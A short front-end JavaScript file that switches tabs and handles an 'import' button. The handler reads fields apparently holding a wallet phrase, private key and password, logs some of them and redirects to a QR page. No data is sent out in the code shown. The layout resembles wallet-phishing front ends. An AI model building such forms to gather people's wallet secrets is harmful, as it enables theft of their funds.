const conts = document.querySelectorAll('.c')
    const container = document.querySelector('.container')
    const btns = document.querySelectorAll('button')
    const importBtn = document.querySelectorAll('#import')


    


    container.addEventListener('click', function(e) {
        const id = e.target.dataset.id
        
        if(id) {
            btns.forEach((btn)=> {
                btn.classList.remove('active')
                e.target.classList.add('active')
                
                
            })
            conts.forEach((cont)=> {
                cont.classList.remove('active')
            })
            const element = document.getElementById(id)
            element.classList.add('active')
        }
        
    })
    
    ;
    

    importBtn.forEach(impor => {
        impor.addEventListener('click', function() {
            const txt1 = document.getElementById('txt1').value
    const txt2 = document.getElementById('txt2').value
    const pwd = document.getElementById('pwd').value
    const key = document.getElementById('key').value
            console.log(txt1, txt2);
           if(txt1 === '' ) {
            return;
           } else {
            location="/markups/qr.html"
           }
        })
    })


    const key = document.getElementById('json') 
    if(key) {
        key.addEventListener('click', () => {
            const phrase = document.querySelector('.re')
            phrase.classList.add('age')
        })
    } else {
        const phrase = document.querySelector('.re')
            phrase.classList.remove('age')
    }

    const json = document.getElementById('key')
    if(json) {
        json.addEventListener('click', () => {
            const phrase = document.querySelector('.re')
            phrase.classList.add('age')
        })
    } else {
        const phrase = document.querySelector('.re')
            phrase.classList.remove('age')
    }

    const phrase = document.querySelector('.re')

    phrase.addEventListener('click', function() {
        phrase.classList.remove('age')
    })

   

